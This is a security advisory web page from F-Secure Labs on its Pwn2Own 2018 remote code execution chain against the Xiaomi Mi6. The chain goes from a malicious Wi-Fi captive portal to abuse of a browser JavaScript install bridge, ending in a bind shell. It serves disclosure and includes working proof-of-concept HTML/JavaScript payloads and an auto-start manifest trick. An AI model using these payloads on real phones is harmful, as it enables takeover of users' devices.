@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+<meta name="x-subsite-id" content="1" />
+
+    <title>Xiaomi Mi6 WiFi Captive Portal Remote Code Execution (Pwn2Own 2018)</title>
+
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">
+
+    <meta name="description" content="">
+    <link rel="canonical" href="https://labs.f-secure.com/advisories/xiaomi-wifi/">
+    <meta name="robots" content="NOODP,index,follow">
+
+    
+
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+
+    <meta name="format-detection" content="telephone=no">
+    
+    <meta property="og:title" content="">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="F-Secure Labs">
+    <meta property="og:url" content="https://labs.f-secure.com/advisories/xiaomi-wifi/">
+    
+    <meta property="og:locale" content='en_GB'>
+    <meta name="twitter:card" content="summary">
+    
+    <meta name="twitter:title" content="">
+    <meta name="twitter:description" content="">
+
+  <script>
+    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
+    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
+    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
+    (window,document,'script','dataLayer','GTM-KD9T85H');
+  </script>
+  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
+<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
+</head>
+<body class="BlogPost" dir="ltr">
+
+    <header class="head menu-opened" id="top">
+	<div class="container">
+		<div class="col12">
+			<div class="logo">
+				<a href="/">F-Secure</a>
+			</div>
+		    <a href="/advisories/xiaomi-wifi/#nav" class="btn-menu">Menu</a>
+
+<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
+    <ul>
+        
+            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
+        
+            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
+        
+            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
+        
+            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
+        
+            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
+        
+        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
+    </ul>
+</nav>
+
+		</div>
+	</div>
+</header>
+
+
+    <div class="wrapper">
+
+        <section class="section">
+  <div class="page-title">
+    <div class="container">
+      <span class="content-type"></span>
+      <h1>Xiaomi Mi6 WiFi Captive Portal Remote Code Execution (Pwn2Own 2018)</h1>
+      
+      
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <div class="col8">
+      <div class="blog-post">
+        
+        <table>
+          <tr>
+            <td>Product</td>
+            <td>Xiaomi Mi6</td>
+          </tr>
+          <tr>
+            <td>Severity</td>
+            <td>High</td>
+          </tr>
+          <tr>
+            <td>CVE Reference</td>
+            <td>N/A</td>
+          </tr>
+          <tr>
+            <td>Type</td>
+            <td>Remote Code Execution</td>
+          </tr>
+        </table>
+        
+        <h1>Introduction</h1><p>At Pwn2own in 2018, F-Secure Labs demonstrated compromise of the Xiaomi Mi6 when it connected to a Wi-Fi hotspot under control by an attacker. At a high level, the following steps were followed:</p><ol><li>User joins the WiFi controlled by an attacker, device checks WiFi for captive portal by sending an HTTP GET request for a test page</li>
+<li>WiFi AP responds with a 200 response for the captive portal check and includes malicious HTML in the body</li>
+<li>The device automatically opens an HTML Viewer with the response, enabling opening of the browser with a specific URL</li>
+<li>A malicious page is opened in the browser with a specific domain that enables a dangerous JavaScript bridge</li>
+<li>The bridge is used to download an app from the Xiaomi app store</li>
+<li>The app auto starts due to a vulnerability in the Android Contact Provider app</li>
+</ol><h1>Technical details</h1><h3>Opening the captive portal</h3><p>The Xiaomi Mi6 (and other Xiaomi devices) act differently from other Android devices in that on detecting a captive portal on a “high priority” network, it will automatically open the portal in an HTML viewer without first prompting the user.</p><p>An attacker can trigger this behaviour by creating a malicious WiFi access point. When the victim first joins the network, they are given access to the Internet. The Xiaomi device will then treat this network as high priority as it provides ‘good’ Internet access. The attacker can then take down the access point and then start it again with the same SSID and BSSID, but now redirecting the following host to their local web server:</p><pre>connect.rom.miui.com</pre><p>Their local web server must include a 200 response for “http://connect.rom.miui.com/generate_204”. This response will include their HTML payload for the next step. This action on a high priority network automatically opens the CaptivePortal app.</p><h3>Initial Web Page redirect the browser</h3><p>This next step uses the HTML loaded in the captive portal to open the browser. </p><p>The captive portal app contains a WebView that loads the result of the ‘generate_204’ request. This WebView has JavaScript enabled, and permits loading of other apps through custom schemes, including the “intent” scheme. As the Xiaomi browser includes a BROWSABLE intent for http schemes, the following HTML can therefore be used to load the browser:</p><pre>&lt;a id='foo' href="intent://testing.mi.com/thanks.html#Intent;package=com.android.browser;scheme=http;end"&gt;intent link to web&lt;/a&gt;<br>&lt;script&gt;<br>function fooit(){<br> document.getElementById('foo').click();<br>}<br>&lt;/script&gt;</pre><h3>Using the JavaScript bridge in the browser to install APKs</h3><p>The Xiaomi Browser app, contains a JavaScript bridge in all pages loaded (including those on the Internet), named “miui”. This includes the following method:</p><p>public abstract class a implements IMiuiApi {<br> public class com.android.browser.js.a$a {</p><pre>@JavascriptInterface public void downloadAndInstallApk(String arg2, String arg3, String arg4) {<br> this.a();<br> ae.a(this.a, arg2, arg3, arg4);<br> }</pre><p>Which calls method “a” that starts an install service:</p><pre>private void a(String arg4, String arg5) {<br> Intent v0 = new Intent("com.xiaomi.market.service.AppDownloadInstallService");<br> v0.setPackage(arg4);<br> v0.putExtra("packageName", arg5);<br> v0.putExtra("type", 2);<br> v0.putExtra("ref", "browser_suggestbutton");<br> this.W.startService(v0);</pre><p>A restriction on this bridge is that it will only run on pages where the URL host ends with one of the following strings held in the array bf.a:</p><pre>public class bf {<br> private static final String[] a;<br> private static Pattern b;<br>static {<br> bf.a = new String[]{".mi.com", ".miui.com", ".xiaomi.com", ".duokan.com"};<br> }</pre><p>It is possible, given that the attacker controls the access point, to open the browser in a clear text host that passes the above URL host check. For the PoC, the following URL was used:</p><pre>http://testing.mi.com/thanks.html</pre><p>This page contained the following HTML:</p><pre>&lt;script&gt;<br> function dofoo(){ window.miui.downloadAndInstallApk("com.mwr.dz","com.mwr.dz"); }<br>&lt;/script&gt;</pre><p>This connects to the Xiaomi app store and downloads an app of our choosing, in this instance, Drozer.</p><h3>Auto-starting Drozer</h3><p>The vulnerability used against the Samsung S8 in 2017 to auto start apps is not limited to Samsung but affected all Android devices. The Contacts provider (com.android.providers.contacts), checks every newly installed app to see if it contains a provider with the following meta-data held in its AndroidManifest.xml file.</p><pre>&lt;meta-data android:name="android.content.ContactDirectory" <br> android:value="true"/&gt;</pre><p>The following entry in Drozer would therefore trigger this issue:</p><pre>&lt;provider android:name="com.mwr.dz.MyContentProvider" <br> android:authorities="dzprovider" <br> android:enabled="true" <br> android:exported="true"&gt; <br> &lt;meta-data android:name="android.content.ContactDirectory" <br> android:value="true"/&gt; <br>&lt;/provider&gt;</pre><p>The contacts provider app on detecting the meta-data, would then attempt to query the provider. This is done by calling the onQuery method, which is overwritten in Drozer to start the main service and open a bind shell:</p><pre>public Cursor query(Uri uri, String[] projection, String selection, <br> String[] selectionArgs, String sortOrder) { <br> Intent i = new Intent(); <br> i.addCategory("com.mwr.dz.START_EMBEDDED"); <br> i.setComponent(new ComponentName("com.mwr.dz", "com.mwr.dz.services.ServerService"));<br> Context c = getContext(); <br> c.startService(i); <br>}</pre><p>This opens a bind shell on TCP:31415</p><p> </p><h1>Detailed Timeline</h1><table><tbody><tr><td>Date</td>
+<td>Summary</td>
+</tr><tr><td>2018-11-14</td>
+<td>Issue reported to ZDI at Pwn2Own</td>
+</tr><tr><td>2019-01-27</td>
+<td>ZDI contacted vendor requesting a status update</td>
+</tr><tr><td>2019-02-06</td>
+<td>ZDI contacted vendor again requesting a status update</td>
+</tr><tr><td>2019-02-06</td>
+<td>Vendor replied stating they plan to publish an update by the end of February</td>
+</tr><tr><td>2019-02-08</td>
+<td>ZDI notified the vendor the case would be 0-dayed if a fix was not available by the end of February</td>
+</tr><tr><td>2019-03-04</td>
+<td> Vendor replied but did not provide ETA</td>
+</tr><tr><td>2019-06-03</td>
+<td>ZDI notified the vendor the intention to 0-day the reports</td>
+</tr><tr><td>2019-11-22</td>
+<td>F-Secure release advisory</td>
+</tr></tbody></table><p> </p><p> </p>
+      </div>
+      <div class="social-share">
+        <p><span class="content-type">Share</span></p>
+        <ul class="social">
+  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/xiaomi-wifi/" target="_blank">Share on Facebook</a></li>
+  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/xiaomi-wifi/&text=Xiaomi Mi6 WiFi Captive Portal Remote Code Execution (Pwn2Own 2018)" target="_blank">Share on LinkedIn</a></li>
+  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/xiaomi-wifi/&title=Xiaomi Mi6 WiFi Captive Portal Remote Code Execution (Pwn2Own 2018)" target="_blank">Share on Twitter</a></li>
+</ul>
+
+      </div>
+    </div>
+    <div class="col4">
+      
+
+      
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="col12">
+        <p>&nbsp;</p>
+      </div>
+    </div>
+  </section>
+
+
+    </div>
+
+    <footer class="foot">
+	<div class="container">
+    <div class="footer-flex-wrap">
+     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
+      <ul class="top-menu">
+        <li><a href="/advisories/xiaomi-wifi/#top" class="btn-gototop">Top</a></li>
+        
+        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
+        
+        
+      </ul>
+   </div>
+   <hr/>
+    <div class="col5 suf1 foot-about">
+      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
+    </div>
+    <div class="col3">
+      <ul class="footer-list no-margin">
+        
+        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
+        
+        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
+        
+        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
+        
+      </ul>
+    </div>
+    <div class="col3">
+     <ul class="footer-list">
+      
+      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
+      
+    </ul>
+  </div>
+</div>
+<div class="end">
+ <div class="container">
+  <hr/>
+  <div class="footer-flex-wrap">
+   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
+    <ul class="social">
+      
+      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
+      
+      
+      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
+      
+      
+      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
+      
+    </ul>
+ </div>
+</div>
+</div>
+</footer>
+
+    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>
+
+    
+    <script src="/themes/mwr/js/min/slides.min.js"></script>
+    
+
+    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>
+
+    <script type="application/ld+json">
+    { "@context" : "http://schema.org",
+      "@type" : "Organization",
+      "name" : "F-Secure Labs",
+      "url" : "https://labs.f-secure.com",
+      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
+      "sameAs" : [
+          "https://twitter.com/fsecurelabs",
+          "https://www.linkedin.com/showcase/28493188"],
+      "contactPoint" : [
+        { "@type" : "ContactPoint",
+          "telephone" : "+441256300920",
+          "contactType" : "customer service"
+        } ]
+    }
+    </script>
+</body>
+</html>
